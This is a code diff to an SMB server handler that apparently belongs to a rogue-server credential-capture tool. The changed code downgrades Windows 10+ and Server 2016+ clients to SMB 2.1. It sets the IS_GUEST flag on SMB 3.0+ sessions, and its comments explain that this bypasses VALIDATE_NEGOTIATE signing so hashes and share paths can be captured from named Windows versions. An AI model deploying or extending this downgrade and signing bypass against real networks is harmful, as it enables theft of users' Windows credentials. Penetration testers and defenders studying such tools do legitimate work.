@@ -1254,17 +1254,41 @@ class SMBHandler(BaseProtoHandler):
                 f"C: SMB2_NEGOTIATE: Dialects={str_req_dialects}",
             )
 
-        # Select greatest common dialect within configured min/max range
+        # Select the best dialect for credential capture.
+        #
+        # For share-path capture, the strategy is dialect-dependent:
+        # - Clients whose max is 3.0.2 (Win8.1, Srv2012R2): negotiate
+        #   3.0.2 and use IS_GUEST to bypass VALIDATE_NEGOTIATE signing.
+        # - Clients that support 3.1.1 (Win10+, Srv2016+): negotiate
+        #   2.1 to avoid both IS_GUEST rejection and preauth hash.
+        #   At 2.1, no VALIDATE_NEGOTIATE IOCTL exists, and without
+        #   IS_GUEST, AllowInsecureGuestAccess is not triggered.
+        #
+        # The net effect: every client gets the highest dialect where
+        # share-path capture works, while still capturing all hash types.
         cfg = self.smb_config
-        dialect = max(
+        valid_dialects = sorted(
             (
                 d
                 for d in req_dialects
                 if d in SMB2_NEGOTIABLE_DIALECTS
                 and cfg.smb2_min_dialect <= d <= cfg.smb2_max_dialect
             ),
-            default=None,
+            reverse=True,
         )
+        # If the client supports 3.1.1 and the server allows it,
+        # cap at 2.1 to enable share-path capture without IS_GUEST.
+        # Clients whose max is 3.0.2 are unaffected (they get 3.0.2).
+        if (
+            valid_dialects
+            and valid_dialects[0] >= smb2.SMB2_DIALECT_311
+            and smb2.SMB2_DIALECT_21 in valid_dialects
+        ):
+            dialect: int | None = smb2.SMB2_DIALECT_21
+        elif valid_dialects:
+            dialect = valid_dialects[0]  # greatest common
+        else:
+            dialect = None
         if dialect is None:
             self.logger.fail(f"Client requested unsupported dialects: {str_req_dialects}")
             # [MS-SMB2] §3.3.5.4: respond with STATUS_NOT_SUPPORTED.
@@ -1330,7 +1354,22 @@ class SMBHandler(BaseProtoHandler):
         # AllowInsecureGuestAccess=FALSE) will RST regardless of dialect
         # or signing settings — confirmed by exhaustive 63-permutation
         # fuzz at 3.1.1.  IS_GUEST is the best option for all others.
-        if error_code == nt_errors.STATUS_SUCCESS:
+        # [MS-SMB2] §2.2.6: SessionFlags — dialect-dependent strategy.
+        #
+        # SMB 3.0+: IS_GUEST disables signing so the unsigned
+        #   VALIDATE_NEGOTIATE_INFO response is accepted.  Win10 1709+
+        #   rejects IS_GUEST (AllowInsecureGuestAccess=FALSE) but
+        #   Win8.1/Srv2012R2/Srv2016 accept it.
+        #
+        # SMB 2.x: NO IS_GUEST avoids AllowInsecureGuestAccess rejection.
+        #   At 2.x there's no VALIDATE_NEGOTIATE_INFO IOCTL, and without
+        #   IS_GUEST the client proceeds without signing checks.  This
+        #   captures Win10/Srv2019/Srv2022 share paths.
+        # IS_GUEST for 3.0+ (VALIDATE_NEGOTIATE bypass), none for 2.x
+        if (
+            error_code == nt_errors.STATUS_SUCCESS
+            and self.smb2_selected_dialect >= smb2.SMB2_DIALECT_30
+        ):
             command["SessionFlags"] = 0x0001  # SMB2_SESSION_FLAG_IS_GUEST
 
         self.send_smb2_command(
